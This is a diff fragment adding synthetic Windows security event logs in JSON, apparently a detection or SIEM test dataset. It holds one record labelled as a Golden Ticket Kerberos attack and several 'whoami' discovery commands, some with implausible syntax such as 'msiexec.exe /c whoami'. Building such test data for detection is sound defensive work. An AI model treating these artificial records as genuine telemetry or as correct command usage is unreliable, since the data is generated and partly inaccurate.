+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 149,
+    "timestamp": "2025-08-18T02:28:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 148,
+    "timestamp": "2025-08-18T02:27:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 147,
+    "timestamp": "2025-08-18T02:26:00Z",
+    "host": "WS01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 146,
+    "timestamp": "2025-08-18T02:25:00Z",
+    "host": "WS02",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 145,
+    "timestamp": "2025-08-18T02:24:00Z",
+    "host": "WS02",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 144,
+    "timestamp": "2025-08-18T02:23:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 143,
+    "timestamp": "2025-08-18T02:22:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 142,
+    "timestamp": "2025-08-18T02:21:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 141,
+    "timestamp": "2025-08-18T02:20:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 140,
+    "timestamp": "2025-08-18T02:19:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 139,
+    "timestamp": "2025-08-18T02:18:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 138,
+    "timestamp": "2025-08-18T02:17:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 137,
+    "timestamp": "2025-08-18T02:16:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "C:\\Windows\\System32\\rundll32.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 136,
+    "timestamp": "2025-08-18T02:15:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 135,
+    "timestamp": "2025-08-18T02:14:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 134,
+    "timestamp": "2025-08-18T02:13:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 133,
+    "timestamp": "2025-08-18T02:12:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 132,
+    "timestamp": "2025-08-18T02:11:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 131,
+    "timestamp": "2025-08-18T02:10:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 130,
+    "timestamp": "2025-08-18T02:09:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 129,
+    "timestamp": "2025-08-18T02:08:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 128,
+    "timestamp": "2025-08-18T02:07:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 127,
+    "timestamp": "2025-08-18T02:06:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Error",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 126,
+    "timestamp": "2025-08-18T02:05:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 125,
+    "timestamp": "2025-08-18T02:04:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 124,
+    "timestamp": "2025-08-18T02:03:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 123,
+    "timestamp": "2025-08-18T02:02:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 122,
+    "timestamp": "2025-08-18T02:01:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 121,
+    "timestamp": "2025-08-18T02:00:00Z",
+    "host": "FILE01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 120,
+    "timestamp": "2025-08-18T01:59:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 119,
+    "timestamp": "2025-08-18T01:58:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 118,
+    "timestamp": "2025-08-18T01:57:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 117,
+    "timestamp": "2025-08-18T01:56:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 116,
+    "timestamp": "2025-08-18T01:55:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 115,
+    "timestamp": "2025-08-18T01:54:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 114,
+    "timestamp": "2025-08-18T01:53:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 113,
+    "timestamp": "2025-08-18T01:52:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 112,
+    "timestamp": "2025-08-18T01:51:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 111,
+    "timestamp": "2025-08-18T01:50:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 110,
+    "timestamp": "2025-08-18T01:49:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 109,
+    "timestamp": "2025-08-18T01:48:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 108,
+    "timestamp": "2025-08-18T01:47:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 107,
+    "timestamp": "2025-08-18T01:46:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 106,
+    "timestamp": "2025-08-18T01:45:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 105,
+    "timestamp": "2025-08-18T01:44:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 104,
+    "timestamp": "2025-08-18T01:43:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 103,
+    "timestamp": "2025-08-18T01:42:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 102,
+    "timestamp": "2025-08-18T01:41:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 101,
+    "timestamp": "2025-08-18T01:40:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 100,
+    "timestamp": "2025-08-18T01:39:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Error",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 99,
+    "timestamp": "2025-08-18T01:38:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 98,
+    "timestamp": "2025-08-18T01:37:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 97,
+    "timestamp": "2025-08-18T01:36:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 96,
+    "timestamp": "2025-08-18T01:35:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 95,
+    "timestamp": "2025-08-18T01:34:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 94,
+    "timestamp": "2025-08-18T01:33:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 93,
+    "timestamp": "2025-08-18T01:32:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 92,
+    "timestamp": "2025-08-18T01:31:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 91,
+    "timestamp": "2025-08-18T01:30:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 90,
+    "timestamp": "2025-08-18T01:29:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 89,
+    "timestamp": "2025-08-18T01:28:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 88,
+    "timestamp": "2025-08-18T01:27:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 87,
+    "timestamp": "2025-08-18T01:26:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 86,
+    "timestamp": "2025-08-18T01:25:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 85,
+    "timestamp": "2025-08-18T01:24:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 84,
+    "timestamp": "2025-08-18T01:23:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 83,
+    "timestamp": "2025-08-18T01:22:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 82,
+    "timestamp": "2025-08-18T01:21:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 81,
+    "timestamp": "2025-08-18T01:20:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 80,
+    "timestamp": "2025-08-18T01:19:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 79,
+    "timestamp": "2025-08-18T01:18:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "C:\\Windows\\System32\\rundll32.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 78,
+    "timestamp": "2025-08-18T01:17:00Z",
+    "host": "WS01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 77,
+    "timestamp": "2025-08-18T01:16:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 76,
+    "timestamp": "2025-08-18T01:15:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "attack_category": "Golden Ticket",
+    "attack_technique": "T1558.001",
+    "message": "Suspicious TGS request for CIFS/DC01 with forged PAC (possible Golden Ticket). Service: cifs/DC01; Encryption: rc4-hmac; TicketOptions: 0x40810010; Client Address: 10.10.5.23.",
+    "tags": [
+      "attack",
+      "kerberos",
+      "golden-ticket"
+    ]
+  },
+  {
+    "id": 75,
+    "timestamp": "2025-08-18T01:14:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 74,
+    "timestamp": "2025-08-18T01:13:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 73,
+    "timestamp": "2025-08-18T01:12:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 72,
+    "timestamp": "2025-08-18T01:11:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 71,
+    "timestamp": "2025-08-18T01:10:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 70,
+    "timestamp": "2025-08-18T01:09:00Z",
+    "host": "DC01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 69,
+    "timestamp": "2025-08-18T01:08:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 68,
+    "timestamp": "2025-08-18T01:07:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 67,
+    "timestamp": "2025-08-18T01:06:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 66,
+    "timestamp": "2025-08-18T01:05:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 65,
+    "timestamp": "2025-08-18T01:04:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 64,
+    "timestamp": "2025-08-18T01:03:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 63,
+    "timestamp": "2025-08-18T01:02:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 62,
+    "timestamp": "2025-08-18T01:01:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 61,
+    "timestamp": "2025-08-18T01:00:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 60,
